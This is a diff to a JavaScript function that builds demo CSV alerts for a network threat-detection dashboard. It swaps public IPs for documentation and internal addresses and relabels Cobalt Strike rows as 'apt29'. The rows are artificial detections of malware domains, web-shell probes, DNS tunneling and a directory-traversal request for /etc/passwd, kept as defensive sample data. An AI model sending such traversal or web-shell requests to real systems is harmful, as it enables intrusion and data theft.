@@ -16,9 +16,9 @@ function getDemoCSV() {
     '"2024-01-11 00:09:27.276419" r2d2 2.200.110.233 63769 2.200.107.169 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 00:09:27.277457" r2d2 2.200.110.232 49455 2.200.107.168 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
     '"2024-01-11 00:09:27.352446" r2d2 2.200.110.232 65381 2.200.107.168 53 UDP DNS soaring.betsystemreviews.com "ek nuclear (malicious)" (static)\n' +
-    '"2024-01-11 00:09:40.713972" r2d2 10.3.160.42 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
-    '"2024-01-11 00:10:13.706777" r2d2 2001:db8:2::11 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
-    '"2024-01-11 00:10:42.453977" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 00:09:40.713972" r2d2 10.2.120.16 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 00:10:13.706777" r2d2 2001:db8:2::11 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
+    '"2024-01-11 00:10:42.453977" r2d2 10.43.192.103 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 00:10:43.385484" r2d2 2.200.110.232 64355 2.200.107.169 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 00:10:48.320403" r2d2 2.200.107.146 53777 194.58.192.49 53 UDP DNS ns1.frobbit.se "rogue dns (malicious)" (static)\n' +
     '"2024-01-11 00:11:43.408971" r2d2 2.200.107.146 33718 52.57.28.60 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
@@ -29,7 +29,7 @@ function getDemoCSV() {
     '"2024-01-11 00:12:11.875602" "dmz probe" 10.3.160.42 22863 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 00:13:01.446480" r2d2 2.200.110.233 63997 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 00:14:06.165338" r2d2 178.17.174.14 54702 2.200.109.24 80 TCP UA "FunWebProducts (Mozilla/4.0 \\(compatible; MSIE 7.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729\\))" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 00:14:44.843235" r2d2 10.3.160.42 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 00:14:44.843235" r2d2 10.2.120.16 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 00:14:50.302674" r2d2 10.38.194.125 63715 10.1.194.234 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 00:15:13.248363" r2d2 2.200.105.226 58477 208.67.222.123 53 UDP DNS pool.supportxmr.com "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 00:16:12.156409" r2d2 10.3.160.42 22865 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -70,10 +70,10 @@ function getDemoCSV() {
     '"2024-01-11 00:38:16.956494" r2d2 2.200.110.232 64882 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 00:38:22.137350" r2d2 2.200.110.233 49162 2.200.107.168 53 UDP DNS un-blocking.info "bad wpad (suspicious)" (static)\n' +
     '"2024-01-11 00:39:43.386876" r2d2 2.200.110.232 64962 2.200.107.169 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
-    '"2024-01-11 00:40:23.122361" r2d2 10.3.160.42 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
+    '"2024-01-11 00:40:23.122361" r2d2 10.2.120.16 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
     '"2024-01-11 00:40:43.206226" r2d2 10.1.81.47 55461 10.1.20.50 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
-    '"2024-01-11 00:40:49.371990" r2d2 2.200.104.32 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
-    '"2024-01-11 00:41:31.943876" r2d2 10.3.160.42 - 185.220.101.47 - ICMP IP 185.220.101.47 "wannacry (malware)" (static)\n' +
+    '"2024-01-11 00:40:49.371990" r2d2 10.128.8.51 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 00:41:31.943876" r2d2 10.2.120.16 - 192.0.2.66 - ICMP IP 192.0.2.66 "wannacry (malware)" (static)\n' +
     '"2024-01-11 00:44:16.661893" r2d2 10.3.160.42 14675 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 00:44:16.761521" r2d2 10.3.160.42 14675 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 00:44:16.861978" r2d2 10.3.160.42 14675 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -92,7 +92,7 @@ function getDemoCSV() {
     '"2024-01-11 00:47:33.960024" r2d2 10.2.120.16 1697 10.1.20.50 53 UDP DNS (iftwqpic).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 00:47:33.960717" r2d2 10.2.120.16 1690 10.1.20.50 53 UDP DNS (hypguvj).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 00:47:33.960717" "dmz probe" 10.2.120.16 1690 10.1.20.50 53 UDP DNS (hypguvj).cc "domain (suspicious)" (static)\n' +
-    '"2024-01-11 00:47:34.709655" r2d2 2.200.104.32 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
+    '"2024-01-11 00:47:34.709655" r2d2 10.128.8.51 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
     '"2024-01-11 00:47:41.262863" r2d2 10.2.120.16 1689 10.1.20.50 53 UDP DNS (qiyawdlponi).ws "domain (suspicious)" (static)\n' +
     '"2024-01-11 00:47:41.263624" r2d2 10.2.120.16 1697 10.1.20.50 53 UDP DNS (mymzfbrgzmq).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 00:47:41.439562" r2d2 10.1.20.50 53 10.2.120.16 1693 UDP DNS (cydifzjxwc).ws "sinkholed by farsight (malware)" (heuristic)\n' +
@@ -101,9 +101,9 @@ function getDemoCSV() {
     '"2024-01-11 00:48:17.742336" r2d2 10.3.160.42 14677 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 00:48:18.140776" r2d2 10.2.120.16 1691 10.1.20.50 53 UDP DNS (zqtzsszurp).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 00:48:43.400830" r2d2 2.200.110.232 49481 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 00:48:52.212583" r2d2 10.2.120.16 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 00:48:52.212583" r2d2 10.43.192.103 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 00:49:56.693955" r2d2 2.200.107.146 63865 52.57.28.60 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
-    '"2024-01-11 00:50:44.461509" r2d2 2.200.104.32 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 00:50:44.461509" r2d2 10.124.72.52 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 00:50:59.607787" r2d2 2.200.110.232 64304 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 00:50:59.633871" r2d2 2.200.107.146 29705 45.54.64.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 00:51:05.271319" r2d2 172.217.40.3 59509 2.200.104.43 53 UDP DNS (135dff3bb776736d6c686a69656c7964747875696200).redacted.com "long domain (suspicious)" (heuristic)\n' +
@@ -113,10 +113,10 @@ function getDemoCSV() {
     '"2024-01-11 00:53:31.000444" r2d2 2.200.108.59 21270,21273,21274,21275,21276,21277,21279,21280,21281,21282,21284,21285,21286,21287,21289,21290,21293,21294,21297,21298,21299,21300,32910,33504,34372,34636,35132,35138,35748,36122,36390,36416,37072,37254,37636,38282,38328,38388,38389,38440,38454,38700,39354,39482,39616,40418,40528,40558,41066,41602,41986,43050,43148,43524,43688,44678,44688,44692,44693,44695,44698,45212,45594,45664,45886,46260,46434,47150,47562,48034,48248,48686,48760,49008,49252,49446,49454,50166,50744,50978,50990,51208,51422,51546,51658,52706,52790,53260,53968,54334,54552,54990,55098,55620,56286,56426,57056,57358,57590,57652,58654,59740,59820,60740 77.53.81.105 21,5484,5708,6309,6811,6854,6882,7787,10248,10935,11205,11232,12519,14323,17048,17287,17335,19523,20026,20102,20692,21747,21945,22885,23408,23450,24078,25767,26331,26982,27280,27879,28446,28666,28718,29672,30620,31154,32363,34246,35589,36654,36861,37195,37396,39154,39671,39714,41433,41546,42927,43183,43532,45076,45649,47415,49134,51201,51512,52052,52061,52915,53177,54227,54391,55427,55848,55900,56017,56441,56591,56658,57353,61087,62915,64777 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 00:54:17.887780" r2d2 10.43.192.103 55661 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 00:54:46.655817" r2d2 2.200.110.233 65528 2.200.107.168 53 UDP DNS soaring.betsystemreviews.com "ek nuclear (malicious)" (static)\n' +
-    '"2024-01-11 00:55:25.212377" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 00:55:25.212377" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 00:56:05.890559" r2d2 2.200.107.146 20853 52.58.214.33 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 00:56:30.778697" r2d2 10.43.192.103 55690 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 00:56:46.829784" r2d2 2.200.104.32 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 00:56:46.829784" r2d2 10.124.72.52 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 00:56:49.263301" r2d2 2.200.110.232 63463 2.200.107.169 53 UDP DNS cdnrep.reimage.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 00:56:56.750409" r2d2 2.200.110.233 64304 2.200.107.168 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
     '"2024-01-11 00:56:56.750409" "dmz probe" 2.200.110.233 64304 2.200.107.168 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
@@ -131,13 +131,13 @@ function getDemoCSV() {
     '"2024-01-11 01:00:50.456098" r2d2 10.43.192.103 55737 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 01:00:56.502738" r2d2 10.43.192.103 55738 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 01:01:32.739846" r2d2 10.43.192.103 55745 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 01:02:23.039823" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 01:02:23.039823" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 01:06:20.800551" r2d2 10.3.160.42 15526 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 01:06:21.892665" r2d2 2.200.110.233 64898 2.200.107.168 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
-    '"2024-01-11 01:06:38.295587" r2d2 10.2.120.16 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 01:06:38.295587" r2d2 10.43.192.103 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 01:06:47.594365" r2d2 2.200.107.228 57849 93.184.221.240 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 01:06:52.335825" r2d2 2.200.110.233 64898 2.200.107.168 53 UDP DNS un-blocking.info "bad wpad (suspicious)" (static)\n' +
-    '"2024-01-11 01:07:13.280376" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 01:07:13.280376" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 01:07:31.763018" r2d2 2.200.110.232 63775 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 01:07:39.559335" r2d2 10.3.160.42 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 01:07:43.382308" r2d2 2.200.110.232 65043 2.200.107.169 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
@@ -148,11 +148,11 @@ function getDemoCSV() {
     '"2024-01-11 01:09:51.769035" r2d2 2.200.110.233 49239 2.200.107.168 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 01:09:51.769449" r2d2 2.200.110.233 64699 2.200.107.168 53 UDP DNS soaring.betsystemreviews.com "ek nuclear (malicious)" (static)\n' +
     '"2024-01-11 01:09:53.781587" r2d2 10.43.192.103 55934 213.252.245.197 454 TCP IPORT 213.252.245.197:454 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 01:11:49.287187" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 01:11:49.287187" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 01:11:59.623690" r2d2 2.200.107.146 42901 194.62.182.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 01:12:06.843047" r2d2 2.200.110.233 64441 2.200.107.168 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
     '"2024-01-11 01:12:06.931518" r2d2 2.200.110.233 65171 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
-    '"2024-01-11 01:13:03.823678" r2d2 10.2.120.16 - 185.220.101.47 - ICMP IP 185.220.101.47 "wannacry (malware)" (static)\n' +
+    '"2024-01-11 01:13:03.823678" r2d2 10.124.72.51 - 192.0.2.66 - ICMP IP 192.0.2.66 "wannacry (malware)" (static)\n' +
     '"2024-01-11 01:14:27.046500" r2d2 2.200.110.232 64295 2.200.107.168 53 UDP DNS taxonprofits.com "cryptowall (malware)" (static)\n' +
     '"2024-01-11 01:15:36.937840" r2d2 2.200.110.232 64566 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 01:15:37.887905" r2d2 2.200.110.232 65366 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -165,10 +165,10 @@ function getDemoCSV() {
     '"2024-01-11 01:22:37.272310" r2d2 2.200.110.233 63272 2.200.107.168 53 UDP DNS recenthosts.ru "generic (malware)" (static)\n' +
     '"2024-01-11 01:24:56.825241" r2d2 2.200.110.232 63419 2.200.107.169 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 01:24:57.025716" r2d2 2.200.110.232 64531 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
-    '"2024-01-11 01:25:21.802759" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 01:25:21.802759" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 01:26:22.597917" r2d2 10.3.160.42 15536 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 01:26:22.799161" r2d2 10.3.160.42 15536 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 01:26:57.034535" r2d2 2.200.104.32 80 10.0.0.66 50052 TCP HTTP "This domain name has been seized by the FBI" "seized domain (suspicious)" (heuristic)\n' +
+    '"2024-01-11 01:26:57.034535" r2d2 10.124.72.52 80 10.0.0.66 50052 TCP HTTP "This domain name has been seized by the FBI" "seized domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 01:26:58.022650" r2d2 2.200.107.146 17912 173.245.58.63 53 UDP DNS cdnrep.reimage.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 01:26:59.609797" r2d2 2.200.107.146 3148 45.54.64.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 01:27:16.988521" r2d2 2.200.110.233 65017 2.200.107.168 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
@@ -178,11 +178,11 @@ function getDemoCSV() {
     '"2024-01-11 01:30:43.398544" r2d2 2.200.107.146 49241 45.54.64.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 01:30:48.247850" r2d2 2.200.110.233 64672 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 01:31:58.274882" r2d2 2.200.110.233 63528 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 01:32:19.895983" r2d2 10.3.160.42 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
-    '"2024-01-11 01:32:37.558675" r2d2 2001:db8:2::11 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 01:32:19.895983" r2d2 10.2.120.16 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 01:32:37.558675" r2d2 2001:db8:2::11 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 01:32:39.777593" r2d2 2.200.105.226 59637 208.67.222.123 53 UDP DNS pool.supportxmr.com "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 01:32:48.445634" r2d2 10.43.192.103 56258 213.252.245.197 457 TCP IPORT 213.252.245.197:457 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 01:33:17.471399" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 01:33:17.471399" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 01:34:17.131597" r2d2 2.200.110.232 65079 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 01:34:18.282300" r2d2 2.200.110.232 49424 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 01:34:55.239779" r2d2 10.43.192.103 56279 213.252.245.197 457 TCP IPORT 213.252.245.197:457 "crypto mining (suspicious)" (static)\n' +
@@ -206,10 +206,10 @@ function getDemoCSV() {
     '"2024-01-11 01:44:46.862494" r2d2 10.43.192.103 56501 213.252.245.197 457 TCP IPORT 213.252.245.197:457 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 01:45:59.239956" r2d2 10.43.192.103 56565 213.252.245.197 457 TCP IPORT 213.252.245.197:457 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 01:46:47.530998" r2d2 10.43.192.103 56573 213.252.245.197 457 TCP IPORT 213.252.245.197:457 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 01:47:46.635961" r2d2 10.3.160.42 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 01:47:46.635961" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 01:48:56.971357" r2d2 10.1.19.42 59246 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 01:49:28.680962" r2d2 2.200.110.233 63608 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 01:50:31.746389" r2d2 2.200.104.32 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
+    '"2024-01-11 01:50:31.746389" r2d2 10.124.72.52 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
     '"2024-01-11 01:50:42.930208" r2d2 10.43.192.103 56668 213.252.245.197 457 TCP IPORT 213.252.245.197:457 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 01:52:57.121173" r2d2 2.200.110.233 65208 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 01:52:58.754984" r2d2 2.200.110.233 64464 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -218,43 +218,43 @@ function getDemoCSV() {
     '"2024-01-11 01:54:27.604352" r2d2 10.3.160.42 13685 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 01:55:17.082250" r2d2 2.200.107.146 34335 192.26.92.30 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 01:55:18.761417" r2d2 2.200.107.146 27886 204.16.253.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 01:56:17.389609" r2d2 10.2.120.16 - 185.220.101.47 - ICMP IP 185.220.101.47 "wannacry (malware)" (static)\n' +
+    '"2024-01-11 01:56:17.389609" r2d2 10.124.72.51 - 192.0.2.66 - ICMP IP 192.0.2.66 "wannacry (malware)" (static)\n' +
     '"2024-01-11 01:56:28.846537" r2d2 2.200.110.233 63683 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 01:56:31.850933" r2d2 10.3.160.42 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 01:56:31.850933" r2d2 10.3.160.42 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
     '"2024-01-11 01:56:46.381702" r2d2 2.200.110.232 63890 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
-    '"2024-01-11 01:57:16.891483" r2d2 2.200.110.232 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 01:57:16.891483" r2d2 10.128.3.52 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 01:57:38.878437" r2d2 2.200.110.233 63607 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 02:00:00.203378" r2d2 2.200.110.232 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 02:00:00.203378" r2d2 10.128.3.51 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
     '"2024-01-11 02:00:28.474397" r2d2 10.3.160.42 13688 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 02:02:59.609597" r2d2 2.200.110.232 64813 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 02:04:07.363899" r2d2 2.200.107.146 13474 205.251.194.217 53 UDP DNS (vio-ck-zvdnggdkkp).dynamic-m.com "dynamic domain (suspicious)" (static)\n' +
     '"2024-01-11 02:04:30.303904" r2d2 10.3.160.42 26021 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 02:04:39.068871" r2d2 2.200.107.146 1212 194.62.182.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 02:04:41.495256" r2d2 2.200.110.232 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:04:41.495256" r2d2 10.128.3.52 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:05:43.396136" r2d2 2.200.110.232 63429 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 02:06:12.476282" r2d2 139.199.65.226 46057 2.200.106.86 80 TCP URL (2.200.106.86)/shell.php "web shells (suspicious)" (static)\n' +
     '"2024-01-11 02:06:30.493917" r2d2 10.3.160.42 26022 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 02:07:59.606990" r2d2 2.200.110.232 65236 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 02:08:07.188815" r2d2 2.200.110.233 65134 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 02:08:14.594773" r2d2 139.199.65.226 6519 2.200.106.86 80 TCP URL (2.200.106.86)/shell.php "web shells (suspicious)" (static)\n' +
-    '"2024-01-11 02:09:30.994602" r2d2 2.200.110.232 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:09:30.994602" r2d2 10.128.3.52 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:10:30.873159" r2d2 10.3.160.42 26024 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
